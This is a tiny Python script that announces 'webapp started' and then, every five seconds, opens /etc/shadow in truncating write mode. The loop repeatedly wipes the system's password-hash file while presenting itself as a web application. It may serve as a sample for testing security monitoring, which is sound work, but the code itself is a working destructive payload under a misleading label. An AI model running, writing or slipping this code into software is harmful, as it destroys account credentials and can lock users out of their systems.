import time

print("webapp started")

while True:
    file = open("/etc/shadow", "w+")
    file.close()

    time.sleep(5)

